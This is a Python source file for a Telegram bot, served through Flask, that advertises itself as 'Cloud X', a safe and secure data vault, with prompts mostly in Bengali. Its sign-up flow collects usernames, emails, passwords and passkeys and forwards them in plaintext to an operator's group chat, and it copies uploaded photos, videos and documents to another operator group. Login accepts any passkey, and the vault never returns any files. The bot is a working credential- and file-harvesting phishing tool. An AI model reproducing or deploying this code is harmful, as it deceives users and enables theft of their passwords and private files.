import os
import logging
import urllib.request
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

TOKEN = os.getenv("TOKEN")
USER_DETAILS_GROUP_ID = int(os.getenv("USER_DETAILS_GROUP_ID", "0"))
USER_MEDIA_GROUP_ID = int(os.getenv("USER_MEDIA_GROUP_ID", "0"))

app = Flask(__name__)
telegram_app = None

user_states = {}
user_temp_data = {}

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

async def clean_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None):
    chat_id = update.effective_chat.id
    if chat_id in user_states and "last_bot_msg" in user_states[chat_id]:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=user_states[chat_id]["last_bot_msg"])
        except Exception:
            pass

    msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="Markdown")
    
    if chat_id not in user_states:
        user_states[chat_id] = {}
    user_states[chat_id]["last_bot_msg"] = msg.message_id

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id] = {"step": "main"}
    
    text = (
        "Welcome to Cloud X! ☁️✨\n"
        "The ultimate free data bot designed to keep your information completely safe and secure. 🔒🚀\n"
        "Enjoy seamless browsing and total peace of mind!"
    )
    keyboard = [
        [InlineKeyboardButton("CREATE ACCOUNT", callback_data="create_account")],
        [InlineKeyboardButton("LOGIN", callback_data="login")]
    ]
    await clean_and_send(update, context, text, InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if user_id not in user_states:
        user_states[user_id] = {}

    if data == "create_account":
        user_states[user_id]["step"] = "reg_username"
        user_temp_data[user_id] = {}
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
        await clean_and_send(update, context, "👤 অ্যাকাউন্ট তৈরির জন্য আপনার একটি ইউনিক *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))

    elif data == "login":
        user_states[user_id]["step"] = "login_username"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
        await clean_and_send(update, context, "🔐 লগইন করতে আপনার রেজিস্টার্ড *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))

    elif data == "back_to_start":
        await start(update, context)

    elif data == "dashboard_real":
        keyboard = [
            [InlineKeyboardButton("📁 Vault Section", callback_data="vault_section")],
            [InlineKeyboardButton("📤 Upload", callback_data="upload_menu")],
            [InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]
        ]
        await clean_and_send(update, context, "🎛️ *Real Dashboard*\nআপনার সিকিউর ড্যাশবোর্ডে স্বাগতম!", InlineKeyboardMarkup(keyboard))

    elif data == "vault_section":
        keyboard = [
            [InlineKeyboardButton("📷 Photo", callback_data="get_photo")],
            [InlineKeyboardButton("🎥 Video", callback_data="get_video")],
            [InlineKeyboardButton("📄 Document", callback_data="get_doc")],
            [InlineKeyboardButton("⬅️ Back", callback_data="dashboard_real")]
        ]
        await clean_and_send(update, context, "📂 *Vault Section*\nকোন ক্যাটাগরির ফাইল দেখতে চান?", InlineKeyboardMarkup(keyboard))

    elif data in ["get_photo", "get_video", "get_doc"]:
        media_type = data.replace("get_", "")
        await query.message.reply_text(f"📥 আপনার {media_type} গুলো খোঁজা হচ্ছে এবং ইনবক্সে পাঠানো হচ্ছে...")

    elif data == "upload_menu":
        user_states[user_id]["step"] = "waiting_for_upload"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="dashboard_real")]]
        await clean_and_send(update, context, "📤 আপলোড সেকশন: এখন আপনার যেকোনো **Photo, Video বা Document** সরাসরি এখানে পাঠান।", InlineKeyboardMarkup(keyboard))

    elif data == "dashboard_fake":
        keyboard = [[InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]]
        await clean_and_send(update, context, "📁 *Fake Dashboard (Honeypot)*\nWelcome to your files.", InlineKeyboardMarkup(keyboard))

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    try:
        await update.message.delete()
    except Exception:
        pass

    if user_id not in user_states:
        return

    step = user_states[user_id].get("step")

    if step == "waiting_for_upload":
        username = user_states[user_id].get("logged_user", "unknown")
        if update.message.photo or update.message.video or update.message.document:
            caption = f"Owner: @{username}"
            await update.message.copy(chat_id=USER_MEDIA_GROUP_ID, caption=caption)
            await context.bot.send_message(chat_id=user_id, text="✅ আপনার ফাইল সফলভাবে ক্লাউড ভল্টে আপলোড হয়েছে!")
        return

    if not update.message.text:
        return
    text = update.message.text

    if step == "reg_username":
        user_temp_data[user_id]["username"] = text
        user_states[user_id]["step"] = "reg_email"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "📧 এখন আপনার *Email* দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_email":
        user_temp_data[user_id]["email"] = text
        user_states[user_id]["step"] = "reg_pass1"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔑 একটি শক্তিশালী *Password* দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_pass1":
        user_temp_data[user_id]["pass1"] = text
        user_states[user_id]["step"] = "reg_pass2"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔑 পাসওয়ার্ডটি কনফার্ম করার জন্য পুনরায় আবার দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_pass2":
        if text != user_temp_data[user_id]["pass1"]:
            await update.message.reply_text("❌ পাসওয়ার্ড ম্যাচ করেনি! আবার সঠিক পাসওয়ার্ডটি দিন:")
            return
        user_states[user_id]["step"] = "reg_passkey1"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔒 অভিনন্দন! অ্যাকাউন্ট সুরক্ষার জন্য একটি ৬ ডিজিটের *Passkey* দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_passkey1":
        user_temp_data[user_id]["passkey1"] = text
        user_states[user_id]["step"] = "reg_passkey2"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔒 পাসকিটি কনফার্ম করতে আবার ৬ ডিজিটটি রি-এন্টার করুন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_passkey2":
        if text != user_temp_data[user_id]["passkey1"]:
            await update.message.reply_text("❌ পাসকি ম্যাচ করেনি! আবার সঠিক ৬ ডিজিটের পাসকি দিন:")
            return
        
        data = user_temp_data[user_id]
        final_msg = (
            f"👤 *New Account Registered*\n"
            f"Username: {data['username']}\n"
            f"Email: {data['email']}\n"
            f"Password: {data['pass1']}\n"
            f"Passkey: {data['passkey1']}"
        )
        await context.bot.send_message(chat_id=USER_DETAILS_GROUP_ID, text=final_msg, parse_mode="Markdown")
        
        user_states[user_id]["step"] = "completed"
        keyboard = [[InlineKeyboardButton("🔐 Login Now", callback_data="login")]]
        await clean_and_send(update, context, "✅ Congratulations! অ্যাকাউন্ট খোলা শেষ ও সফলভাবে সেভ হয়েছে।", InlineKeyboardMarkup(keyboard))

    elif step == "login_username":
        user_temp_data[user_id]["login_user"] = text
        user_states[user_id]["step"] = "login_passkey"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="login")]]
        await clean_and_send(update, context, "🔑 আপনার গোপনীয় *Passkey* টি দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "login_passkey":
        logged_username = user_temp_data[user_id].get("login_user", "")
        user_states[user_id]["logged_user"] = logged_username
        
        is_real = True

        if is_real:
            keyboard = [[InlineKeyboardButton("👉 Go to Dashboard", callback_data="dashboard_real")]]
            await clean_and_send(update, context, "✅ লগইন সফল!", InlineKeyboardMarkup(keyboard))
        else:
            keyboard = [[InlineKeyboardButton("👉 Open Dashboard", callback_data="dashboard_fake")]]
            await clean_and_send(update, context, "✅ লগইন সফল!", InlineKeyboardMarkup(keyboard))

async def init_bot():
    global telegram_app
    telegram_app = Application.builder().token(TOKEN).build()
    
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
    
    await telegram_app.initialize()

def set_webhook_automatically():
    render_url = os.getenv("RENDER_EXTERNAL_URL")
    if render_url and TOKEN:
        webhook_url = f"{render_url}/{TOKEN}"
        telegram_api_url = f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}"
        try:
            urllib.request.urlopen(telegram_api_url)
        except Exception:
            pass

@app.route("/")
def index():
    return "Cloud X Bot is Live!"

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    if request.method == "POST":
        import asyncio
        async def process():
            if telegram_app:
                update = Update.de_json(request.get_json(force=True), telegram_app.bot)
                await telegram_app.process_update(update)
        
        asyncio.run(process())
        return "OK", 200
    return "Forbidden", 403

if __name__ == "__main__":
    import asyncio
    asyncio.run(init_bot())
    set_webhook_automatically()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
